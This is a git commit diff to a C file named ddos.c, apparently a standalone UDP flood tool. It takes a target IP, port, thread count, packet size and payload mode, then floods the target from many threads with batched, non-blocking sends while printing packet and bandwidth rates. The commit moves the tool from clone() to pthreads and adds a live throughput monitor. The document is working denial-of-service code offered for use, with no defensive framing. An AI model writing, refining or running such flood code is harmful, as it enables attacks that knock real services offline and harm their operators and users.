ba2936cbdaed2ca1e1b5a24c5b8729739e911a1b
HaiYTB <107292361+HaiYTB@users.noreply.github.com>
2025-06-03 13:30:44 +0700

    Add files via upload

--- ddos.c
+++ ddos.c
@@ -1,49 +1,65 @@
 #define _GNU_SOURCE
-#include <signal.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
-#include <sched.h>
-#include <fcntl.h>
-#include <time.h>
+#include <pthread.h>
+#include <arpa/inet.h>
 #include <sys/mman.h>
 #include <sys/socket.h>
 #include <sys/time.h>
-#include <netinet/in.h>
-#include <arpa/inet.h>
-#include <linux/if_packet.h>
-#include <net/ethernet.h>
-#include <pthread.h>
+#include <fcntl.h>
+#include <time.h>
 
 #define MAX_BATCH 128
 #define SO_SNDBUF_SIZE (1024 * 1024 * 4)
-#define STACK_SIZE (1024 * 1024)
 
 int pps_counter = 0;
 int mbps_counter = 0;
-int use_affinity = 0;
 
 struct thread_args {
     char ip[64];
     int port;
     int packet_size;
     char* payload;
-    int core_id;
 };
 
-int udp_flood(void* arg) {
-    struct thread_args* args = (struct thread_args*)arg;
+void* monitor_thread(void* arg) {
+    (void)arg;
 
-    if (use_affinity) {
-        cpu_set_t cpuset;
-        CPU_ZERO(&cpuset);
-        CPU_SET(args->core_id, &cpuset);
-        sched_setaffinity(0, sizeof(cpuset), &cpuset);
+    while (1) {
+        sleep(1);
+
+        int pps = __sync_lock_test_and_set(&pps_counter, 0);
+        int bytes = __sync_lock_test_and_set(&mbps_counter, 0);
+
+        double mbps = (bytes * 8.0) / 1000000.0;     // Megabits/sec
+        double MBps = bytes / 1000000.0;             // Megabytes/sec
+        double kbps = (bytes * 8.0) / 1000.0;        // Kilobits/sec
+
+        time_t now = time(NULL);
+        struct tm* t = localtime(&now);
+
+        printf(
+            "\033[96m[%02d:%02d:%02d] "
+            "PPS: %6d | Mb/s: %7.2f | MB/s: %7.2f\033[0m\n",
+            t->tm_hour, t->tm_min, t->tm_sec,
+            pps, mbps, MBps
+        );
+        fflush(stdout);
     }
 
+    return NULL;
+}
+
+void* udp_flood(void* arg) {
+    struct thread_args* args = (struct thread_args*)arg;
+
     int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
-    if (sockfd < 0) exit(1);
+    if (sockfd < 0) {
+        perror("socket");
+        return NULL;
+    }
 
     int sndbuf = SO_SNDBUF_SIZE;
     int enable = 1;
@@ -52,7 +68,8 @@ int udp_flood(void* arg) {
 
     fcntl(sockfd, F_SETFL, O_NONBLOCK);
 
-    struct sockaddr_in target = {0};
+    struct sockaddr_in target;
+    memset(&target, 0, sizeof(target));
     target.sin_family = AF_INET;
     target.sin_port = htons(args->port);
     inet_pton(AF_INET, args->ip, &target.sin_addr);
@@ -67,6 +84,9 @@ int udp_flood(void* arg) {
         msgs[i].msg_hdr.msg_iovlen = 1;
         msgs[i].msg_hdr.msg_name = &target;
         msgs[i].msg_hdr.msg_namelen = sizeof(target);
+        msgs[i].msg_hdr.msg_control = NULL;
+        msgs[i].msg_hdr.msg_controllen = 0;
+        msgs[i].msg_hdr.msg_flags = 0;
     }
 
     while (1) {
@@ -77,7 +97,8 @@ int udp_flood(void* arg) {
         }
     }
 
-    return 0;
+    close(sockfd);
+    return NULL;
 }
 
 void fill_payload(char* buffer, int size, const char* mode) {
@@ -97,8 +118,8 @@ void fill_payload(char* buffer, int size, const char* mode) {
 }
 
 int main(int argc, char* argv[]) {
-    if (argc < 7) {
-        fprintf(stderr, "Usage: %s <ip> <port> <threads> <packet_size> <payload_mode> <affinity 0|1>\n", argv[0]);
+    if (argc < 6) {
+        printf("Usage: %s <ip> <port> <threads> <packet_size> <payload_mode>\n", argv[0]);
         return 1;
     }
 
@@ -107,41 +128,40 @@ int main(int argc, char* argv[]) {
     int threads = atoi(argv[3]);
     int packet_size = atoi(argv[4]);
     char* payload_mode = argv[5];
-    use_affinity = atoi(argv[6]);
+
+    printf("\033[96m[*] Target: %s:%d\n[*] Threads: %d | Size: %d | Payload: %s\033[0m\n",
+           ip, port, threads, packet_size, payload_mode);
 
     srand(time(NULL));
 
     char* payload = mmap(NULL, packet_size, PROT_READ | PROT_WRITE,
-                         MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
+                            MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
     if (!payload) {
         perror("mmap");
         return 1;
     }
     fill_payload(payload, packet_size, payload_mode);
 
+    pthread_t monitor;
+    pthread_create(&monitor, NULL, monitor_thread, NULL);
+    pthread_detach(monitor);
+
+    pthread_t th[threads];
+    struct thread_args args[threads];
+
     for (int i = 0; i < threads; ++i) {
-        void* stack = mmap(NULL, STACK_SIZE, PROT_READ | PROT_WRITE,
-                           MAP_PRIVATE | MAP_ANONYMOUS | MAP_STACK, -1, 0);
-        if (!stack) exit(1);
+        strncpy(args[i].ip, ip, sizeof(args[i].ip) - 1);
+        args[i].port = port;
+        args[i].packet_size = packet_size;
+        args[i].payload = payload;
 
-        struct thread_args* args = malloc(sizeof(struct thread_args));
-        strncpy(args->ip, ip, sizeof(args->ip) - 1);
-        args->port = port;
-        args->packet_size = packet_size;
-        args->payload = payload;
-        args->core_id = i;
-
-        clone(udp_flood, stack + STACK_SIZE, CLONE_VM | CLONE_FS | CLONE_FILES | SIGCHLD, args);
+        pthread_create(&th[i], NULL, udp_flood, &args[i]);
     }
 
-    while (1) {
-        sleep(1);
-        int pps = __sync_lock_test_and_set(&pps_counter, 0);
-        int bytes = __sync_lock_test_and_set(&mbps_counter, 0);
-        double mbps = (bytes * 8.0) / 1000000.0;
-        double MBps = bytes / 1000000.0;
-        fprintf(stderr, "PPS: %6d | Mbps: %7.2f | MBps: %7.2f\n", pps, mbps, MBps);
+    for (int i = 0; i < threads; ++i) {
+        pthread_join(th[i], NULL);
     }
 
+    munmap(payload, packet_size);
     return 0;
 }
